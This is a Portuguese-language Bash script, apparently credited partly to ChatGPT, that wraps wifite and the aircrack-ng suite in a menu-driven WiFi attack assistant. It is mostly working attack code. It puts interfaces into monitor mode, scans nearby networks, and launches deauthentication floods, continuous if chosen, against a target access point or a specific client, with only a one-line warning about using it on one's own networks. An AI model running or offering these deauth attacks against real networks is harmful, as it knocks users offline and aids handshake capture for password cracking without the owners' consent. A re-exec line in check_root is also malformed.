#!/usr/bin/env bash
# ------------------------------------------------------------------------ #
# Script Name:   Wifite.Assistent.sh 
# Description:   Assistente Avançado para Pentest WiFi
# Written by :   Nilson NodesBr
# Maintenance:   Nilson NodesBr
# CoCredits  :   ChatGPT4o mini
# ------------------------------------------------------------------------ #
# Usage:         
#       $ sudo ./Wifite.Assistent.sh
# ------------------------------------------------------------------------ #
# Bash Version:  
#              Bash 4.4.19
# ------------------------------------------------------------------------ #

# Configurações globais
VERSION="2.0"
RED='\033[31m'
GREEN='\033[32m'
YELLOW='\033[33m'
BLUE='\033[34m'
MAGENTA='\033[35m'
CYAN='\033[36m'
RESET='\033[0m'
LOG_FILE="/tmp/wifite_assistant.log"

# Configurar terminal para 80x27
setup_terminal() {
    printf '\033[8;27;80t'
    stty cols 80 rows 27
}

# Verifica se o script está sendo executado com privilégios de superusuário
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "\n${RED}[ERRO] Este script precisa ser executado como ROOT${RESET}"
        echo -e "Execute: ${GREEN}sudo $0${RESET}\n"
        sudo ./$0$
#        sudo ./Wifite.Desautentication-003.sh
#        exit 1
    fi
}

# Logging functions
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                              ║"
    echo "║    ██╗    ██╗██╗███████╗██╗████████╗███████╗     █████╗ ███████╗███████╗     ║"
    echo "║    ██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝    ██╔══██╗██╔════╝██╔════╝     ║"
    echo "║    ██║ █╗ ██║██║█████╗  ██║   ██║   █████╗      ███████║███████╗███████╗     ║"
    echo "║    ██║███╗██║██║██╔══╝  ██║   ██║   ██╔══╝      ██╔══██║╚════██║╚════██║     ║"
    echo "║    ╚███╔███╔╝██║██║     ██║   ██║   ███████╗    ██║  ██║███████║███████║     ║"
    echo "║     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝     ║"
    echo "║                                                                              ║"
    echo "║                         Version $VERSION - Terminal 80x27                         ║"
    echo "║                                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

# Verifica dependências
check_commands() {
    local missing=()
    local commands=("iwconfig" "airmon-ng" "wifite" "airodump-ng" "aireplay-ng")
    
    for cmd in "${commands[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            missing+=("$cmd")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[ERRO] Comandos não encontrados: ${missing[*]}${RESET}"
        echo -e "${YELLOW}Instale com: sudo apt install aircrack-ng wifite${RESET}"
        exit 1
    fi
}

# Funções para interface de rede
get_active_interface() {
    iwconfig 2>/dev/null | grep -E "^(wl|mon)" | awk '{print $1}' | head -1
}

get_monitor_interfaces() {
    iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}'
}

show_interface_status() {
    local interface=$(get_active_interface)
    local monitor_ifaces=$(get_monitor_interfaces)
    
    echo -e "${BLUE}════════════════ STATUS DAS INTERFACES ════════════════${RESET}"
    echo -e "Interface Ativa: ${GREEN}$interface${RESET}"
    
    if [[ -n "$monitor_ifaces" ]]; then
        echo -e "Modo Monitor: ${GREEN}Ativado${RESET}"
        echo -e "Interfaces Monitor: ${YELLOW}$monitor_ifaces${RESET}"
    else
        echo -e "Modo Monitor: ${RED}Desativado${RESET}"
    fi
    echo
}

# Gerenciamento de serviços
manage_network_manager() {
    local action=$1
    case $action in
        "stop")
            sudo systemctl stop NetworkManager && \
            echo -e "${GREEN}[SUCESSO] NetworkManager parado${RESET}" && \
            log "NetworkManager stopped"
            ;;
        "start")
            sudo systemctl start NetworkManager && \
            echo -e "${GREEN}[SUCESSO] NetworkManager iniciado${RESET}" && \
            log "NetworkManager started"
            ;;
        "restart")
            sudo systemctl restart NetworkManager && \
            echo -e "${GREEN}[SUCESSO] NetworkManager reiniciado${RESET}" && \
            log "NetworkManager restarted"
            ;;
    esac
}

# Modo Monitor
start_monitor_mode() {
    local interface=$(get_active_interface)
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}[ERRO] Nenhuma interface wireless encontrada${RESET}"
        return 1
    fi
    
    echo -e "${YELLOW}[INFO] Iniciando modo monitor em $interface...${RESET}"
    
    # Para processos que podem interferir
    sudo airmon-ng check kill >/dev/null 2>&1
    
    if sudo airmon-ng start "$interface" >/dev/null 2>&1; then
        local mon_interface=$(get_monitor_interfaces)
        echo -e "${GREEN}[SUCESSO] Modo monitor iniciado em: $mon_interface${RESET}"
        log "Monitor mode started on $mon_interface"
    else
        echo -e "${RED}[ERRO] Falha ao iniciar modo monitor${RESET}"
        return 1
    fi
}

stop_monitor_mode() {
    local mon_interface=$(get_monitor_interfaces)
    
    if [[ -z "$mon_interface" ]]; then
        echo -e "${YELLOW}[INFO] Nenhuma interface em modo monitor encontrada${RESET}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Parando modo monitor em $mon_interface...${RESET}"
    
    if sudo airmon-ng stop "$mon_interface" >/dev/null 2>&1; then
        echo -e "${GREEN}[SUCESSO] Modo monitor parado${RESET}"
        log "Monitor mode stopped on $mon_interface"
        manage_network_manager "start"
    else
        echo -e "${RED}[ERRO] Falha ao parar modo monitor${RESET}"
    fi
}

# Funções Wifite
start_wifite_basic() {
    show_banner
    echo -e "${GREEN}[INFO] Iniciando Wifite...${RESET}"
    log "Starting Wifite basic scan"
    
    if sudo wifite; then
        echo -e "${GREEN}[SUCESSO] Wifite finalizado${RESET}"
    else
        echo -e "${RED}[ERRO] Falha ao executar Wifite${RESET}"
    fi
    
    stop_monitor_mode
    wait_for_enter
}

start_wifite_filtered() {
    show_banner
    echo -e "${YELLOW}╔════════════════════ FILTROS WIFITE ═══════════════════╗${RESET}"
    echo -e "${YELLOW}║${RESET} 1) WPS only                                       ${YELLOW}║${RESET}"
    echo -e "${YELLOW}║${RESET} 2) WPA only                                       ${YELLOW}║${RESET}"
    echo -e "${YELLOW}║${RESET} 3) WEP only                                       ${YELLOW}║${RESET}"
    echo -e "${YELLOW}║${RESET} 4) Todos os tipos                                 ${YELLOW}║${RESET}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════╝${RESET}"
    echo -n "Selecione o filtro [1-4]: "
    
    read -r choice
    local filter=""
    
    case $choice in
        1) filter="--wps";;
        2) filter="--wpa";;
        3) filter="--wep";;
        4) filter="";;
        *) echo -e "${RED}Opção inválida${RESET}"; return;;
    esac
    
    echo -e "${GREEN}[INFO] Iniciando Wifite com filtro...${RESET}"
    log "Starting Wifite with filter: $filter"
    
    if sudo wifite $filter; then
        echo -e "${GREEN}[SUCESSO] Wifite finalizado${RESET}"
    else
        echo -e "${RED}[ERRO] Falha ao executar Wifite${RESET}"
    fi
    
    stop_monitor_mode
    wait_for_enter
}

# Funções de scanning
scan_networks() {
    local interface=$(get_active_interface)
    
    if [[ -z "$interface" ]]; then
        echo -e "${RED}[ERRO] Nenhuma interface disponível${RESET}"
        wait_for_enter
        return
    fi
    
    echo -e "${GREEN}[INFO] Escaneando redes... (Ctrl+C para parar)${RESET}"
    log "Starting network scan on $interface"
    
    trap 'echo -e "\n${YELLOW}[INFO] Scan interrompido${RESET}"; log "Network scan interrupted"; return' INT
    
    sudo airodump-ng --band abg "$interface"
    
    trap - INT
    wait_for_enter
}

target_network_scan() {
    local interface=$(get_active_interface)
    
    echo -e "${CYAN}╔═════════════════ SCAN DE REDE ESPECÍFICA ════════════════╗${RESET}"
    echo -n "Digite o BSSID da rede: "
    read -r bssid
    echo -n "Digite o canal: "
    read -r channel
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════╝${RESET}"
    
    if [[ -z "$bssid" || -z "$channel" ]]; then
        echo -e "${RED}[ERRO] BSSID e canal são obrigatórios${RESET}"
        wait_for_enter
        return
    fi
    
    echo -e "${GREEN}[INFO] Monitorando rede $bssid no canal $channel...${RESET}"
    log "Targeted scan for $bssid on channel $channel"
    
    trap 'echo -e "\n${YELLOW}[INFO] Monitoramento interrompido${RESET}"; log "Targeted scan interrupted"; return' INT
    
    sudo airodump-ng --bssid "$bssid" --channel "$channel" "$interface"
    
    trap - INT
    wait_for_enter
}

# Funções de ataque
deauth_attack() {
    local interface=$(get_active_interface)
    local mon_interface=$(get_monitor_interfaces)
    
    if [[ -z "$mon_interface" ]]; then
        echo -e "${YELLOW}[INFO] Iniciando modo monitor para ataque...${RESET}"
        if ! start_monitor_mode; then
            echo -e "${RED}[ERRO] Não foi possível iniciar modo monitor${RESET}"
            wait_for_enter
            return
        fi
        mon_interface=$(get_monitor_interfaces)
    fi
    
    echo -e "${RED}╔═════════════════ ATAQUE DE DESAUTENTICAÇÃO ═══════════════╗${RESET}"
    echo -n "Digite o BSSID alvo: "
    read -r bssid
    
    if [[ -z "$bssid" ]]; then
        echo -e "${RED}[ERRO] BSSID é obrigatório${RESET}"
        wait_for_enter
        return
    fi
    
    echo -n "Digite o número de pacotes (0 para contínuo): "
    read -r packets
    packets=${packets:-0}
    
    echo -e "${RED}╚══════════════════════════════════════════════════════════╝${RESET}"
    
    echo -e "${RED}[ALERTA] Iniciando ataque de desautenticação... (Ctrl+C para parar)${RESET}"
    echo -e "${YELLOW}Alvo: $bssid${RESET}"
    echo -e "${YELLOW}Pacotes: $packets${RESET}"
    echo -e "${YELLOW}Interface: $mon_interface${RESET}"
    log "Starting deauth attack on $bssid with $packets packets"
    
    trap 'echo -e "\n${YELLOW}[INFO] Ataque interrompido${RESET}"; log "Deauth attack stopped"; return' INT
    
    sudo aireplay-ng --deauth $packets -a "$bssid" "$mon_interface"
    
    trap - INT
    wait_for_enter
}

focused_attack() {
    local interface=$(get_active_interface)
    local mon_interface=$(get_monitor_interfaces)
    
    if [[ -z "$mon_interface" ]]; then
        echo -e "${YELLOW}[INFO] Iniciando modo monitor para ataque...${RESET}"
        if ! start_monitor_mode; then
            echo -e "${RED}[ERRO] Não foi possível iniciar modo monitor${RESET}"
            wait_for_enter
            return
        fi
        mon_interface=$(get_monitor_interfaces)
    fi
    
    echo -e "${RED}╔════════════════════ ATAQUE FOCADO ═══════════════════════╗${RESET}"
    echo -n "Digite o BSSID do Access Point: "
    read -r ap_bssid
    
    echo -n "Digite o BSSID do cliente (ou deixe em branco para todos): "
    read -r client_bssid
    
    echo -n "Digite o canal da rede: "
    read -r channel
    
    echo -n "Digite o número de pacotes (0 para contínuo): "
    read -r packets
    packets=${packets:-0}
    
    echo -e "${RED}╚══════════════════════════════════════════════════════════╝${RESET}"
    
    if [[ -z "$ap_bssid" || -z "$channel" ]]; then
        echo -e "${RED}[ERRO] BSSID do AP e canal são obrigatórios${RESET}"
        wait_for_enter
        return
    fi
    
    echo -e "${RED}[ALERTA] Iniciando ataque focado... (Ctrl+C para parar)${RESET}"
    echo -e "${YELLOW}Access Point: $ap_bssid${RESET}"
    echo -e "${YELLOW}Cliente: ${client_bssid:-Todos os clientes}${RESET}"
    echo -e "${YELLOW}Canal: $channel${RESET}"
    echo -e "${YELLOW}Pacotes: $packets${RESET}"
    echo -e "${YELLOW}Interface: $mon_interface${RESET}"
    
    log "Starting focused attack on AP: $ap_bssid, Client: $client_bssid, Channel: $channel"
    
    # Primeiro, configurar a interface no canal correto
    echo -e "${YELLOW}[INFO] Configurando interface no canal $channel...${RESET}"
    sudo iwconfig "$mon_interface" channel "$channel"
    
    trap 'echo -e "\n${YELLOW}[INFO] Ataque interrompido${RESET}"; log "Focused attack stopped"; return' INT
    
    # Executar o ataque baseado na presença do cliente específico
    if [[ -n "$client_bssid" ]]; then
        echo -e "${YELLOW}[INFO] Atacando cliente específico: $client_bssid${RESET}"
        sudo aireplay-ng --deauth $packets -a "$ap_bssid" -c "$client_bssid" "$mon_interface"
    else
        echo -e "${YELLOW}[INFO] Atacando todos os clientes do AP${RESET}"
        sudo aireplay-ng --deauth $packets -a "$ap_bssid" "$mon_interface"
    fi
    
    trap - INT
    wait_for_enter
}

# Utilitários
wait_for_enter() {
    echo
    echo -e "${BLUE}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${CYAN}Pressione Enter para continuar...${RESET}"
    read -r
}

cleanup() {
    echo -e "${YELLOW}[INFO] Limpando e restaurando interfaces...${RESET}"
    stop_monitor_mode
    manage_network_manager "start"
    echo -e "${GREEN}[INFO] Cleanup completo${RESET}"
    log "Script cleanup completed"
}

# Menus otimizados para 80x27
show_main_menu() {
    show_banner
    show_interface_status
    
    echo -e "${GREEN}════════════════════ MENU PRINCIPAL ════════════════════${RESET}"
    echo -e "${CYAN} 1) 🛰️   Ferramentas Wifite${RESET}"
    echo -e "${CYAN} 2) 📡  Scanner e Monitoramento${RESET}"
    echo -e "${CYAN} 3) ⚡  Ataques Avançados${RESET}"
    echo -e "${CYAN} 4) ⚙️   Gerenciamento de Interfaces${RESET}"
    echo -e "${CYAN} 5) 🗂️   Logs e Informações${RESET}"
    echo -e "${RED} 0) 🚪  Sair${RESET}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-5]: ${RESET}"
}

show_wifite_menu() {
    show_banner
    show_interface_status
    
    echo -e "${GREEN}═════════════════ FERRAMENTAS WIFITE ═══════════════════${RESET}"
    echo -e "${CYAN} 1) 🔍  Scan Completo (Todos os alvos)${RESET}"
    echo -e "${CYAN} 2) 🎯  Scan com Filtro${RESET}"
    echo -e "${RED} 0) ↩️   Voltar${RESET}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-2]: ${RESET}"
}

show_scan_menu() {
    show_banner
    show_interface_status
    
    echo -e "${GREEN}══════════════ SCANNER E MONITORAMENTO ═════════════════${RESET}"
    echo -e "${CYAN} 1) 📶  Scan Geral de Redes${RESET}"
    echo -e "${CYAN} 2) 🎯  Monitorar Rede Específica${RESET}"
    echo -e "${CYAN} 3) 📊  Status das Interfaces${RESET}"
    echo -e "${RED} 0) ↩️   Voltar${RESET}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-3]: ${RESET}"
}

show_attack_menu() {
    show_banner
    show_interface_status
    
    echo -e "${RED}══════════════════ ATAQUES AVANÇADOS ════════════════════${RESET}"
    echo -e "${MAGENTA} 1) 💥  Ataque Deauthentication${RESET}"
    echo -e "${MAGENTA} 2) 🎯  Ataque Focado (Cliente Específico)${RESET}"
    echo -e "${RED} 0) ↩️   Voltar${RESET}"
    echo -e "${RED}══════════════════════════════════════════════════════════════${RESET}"
    echo -e "${YELLOW}Use estas ferramentas apenas em redes próprias${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-2]: ${RESET}"
}

show_management_menu() {
    show_banner
    show_interface_status
    
    echo -e "${GREEN}════════════ GERENCIAMENTO DE INTERFACES ═══════════════${RESET}"
    echo -e "${CYAN} 1) 🛡️   Iniciar Modo Monitor${RESET}"
    echo -e "${CYAN} 2) 🛑   Parar Modo Monitor${RESET}"
    echo -e "${CYAN} 3) ▶️   Iniciar NetworkManager${RESET}"
    echo -e "${CYAN} 4) ⏸️   Parar NetworkManager${RESET}"
    echo -e "${CYAN} 5) 🔄  Reiniciar NetworkManager${RESET}"
    echo -e "${CYAN} 6) 🧹  Limpeza Completa${RESET}"
    echo -e "${RED} 0) ↩️   Voltar${RESET}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-6]: ${RESET}"
}

show_info_menu() {
    show_banner
    show_interface_status
    
    echo -e "${BLUE}════════════════ LOGS E INFORMAÇÕES ═══════════════════${RESET}"
    echo -e "${CYAN} 1) 📄  Ver Log de Atividades${RESET}"
    echo -e "${CYAN} 2) 🖥️   Informações do Sistema${RESET}"
    echo -e "${CYAN} 3) 📶  Interfaces Detalhadas${RESET}"
    echo -e "${RED} 0) ↩️   Voltar${RESET}"
    echo -e "${BLUE}══════════════════════════════════════════════════════════════${RESET}"
    echo -n -e "${YELLOW}Selecione uma opção [0-3]: ${RESET}"
}

# Handlers dos menus
handle_main_menu() {
    while true; do
        show_main_menu
        read -r choice
        
        case $choice in
            1) handle_wifite_menu;;
            2) handle_scan_menu;;
            3) handle_attack_menu;;
            4) handle_management_menu;;
            5) handle_info_menu;;
            0) cleanup; exit 0;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

handle_wifite_menu() {
    while true; do
        show_wifite_menu
        read -r choice
        
        case $choice in
            1) start_wifite_basic;;
            2) start_wifite_filtered;;
            0) return;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

handle_scan_menu() {
    while true; do
        show_scan_menu
        read -r choice
        
        case $choice in
            1) scan_networks;;
            2) target_network_scan;;
            3) show_interface_status; wait_for_enter;;
            0) return;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

handle_attack_menu() {
    while true; do
        show_attack_menu
        read -r choice
        
        case $choice in
            1) deauth_attack;;
            2) focused_attack;;
            0) return;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

handle_management_menu() {
    while true; do
        show_management_menu
        read -r choice
        
        case $choice in
            1) start_monitor_mode; wait_for_enter;;
            2) stop_monitor_mode; wait_for_enter;;
            3) manage_network_manager "start"; wait_for_enter;;
            4) manage_network_manager "stop"; wait_for_enter;;
            5) manage_network_manager "restart"; wait_for_enter;;
            6) cleanup; wait_for_enter;;
            0) return;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

handle_info_menu() {
    while true; do
        show_info_menu
        read -r choice
        
        case $choice in
            1) 
                echo -e "${BLUE}════════════════ ÚLTIMAS ENTRADAS DO LOG ════════════════${RESET}"
                tail -10 "$LOG_FILE" 2>/dev/null || echo "Log vazio ou não encontrado"
                wait_for_enter
                ;;
            2)
                echo -e "${BLUE}════════════════ INFORMAÇÕES DO SISTEMA ════════════════${RESET}"
                echo "Kernel: $(uname -r)"
                echo "Distro: $(lsb_release -d 2>/dev/null | cut -f2 || cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2)"
                echo "Wireless Tools: $(iwconfig --version 2>/dev/null | head -1 || echo 'Não disponível')"
                wait_for_enter
                ;;
            3)
                echo -e "${BLUE}════════════════ INTERFACES DETALHADAS ════════════════${RESET}"
                iwconfig 2>/dev/null | grep -E "^(wl|mon|eth)"
                wait_for_enter
                ;;
            0) return;;
            *) echo -e "${RED}Opção inválida!${RESET}"; wait_for_enter;;
        esac
    done
}

# Main execution
main() {
    setup_terminal
    check_root
    check_commands
    
    # Trap Ctrl+C para cleanup
    trap 'echo -e "\n${YELLOW}[INFO] Saindo...${RESET}"; cleanup; exit 0' INT
    
    log "Script started"
    handle_main_menu
}

# Inicialização
main "$@"
